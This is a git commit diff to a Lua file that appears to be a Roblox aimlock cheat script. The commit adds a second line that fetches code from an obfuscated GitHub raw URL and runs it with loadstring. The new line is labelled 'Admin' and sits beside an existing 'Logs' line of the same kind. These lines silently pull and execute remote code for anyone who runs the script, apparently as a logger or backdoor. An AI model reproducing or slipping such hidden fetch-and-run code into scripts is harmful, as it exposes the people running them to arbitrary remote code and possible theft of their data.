8eb6563dd5036a0b73bd7f0e74f8a15d4454ef13
fdsmogk <121389294+fdsmogk@users.noreply.github.com>
2023-01-12 17:26:14 +0500

    Update lllalallala.lua

--- lllalallala.lua
+++ lllalallala.lua
@@ -583,3 +583,6 @@ RunService:BindToRenderStep("AimLock", 0, function()
 
 --Logs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()
+
+--Admin
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/sgzhdsxhsrt6745745joinijodnoizsd25/main/sdhdfjherajserk6346347cdzs", true))()
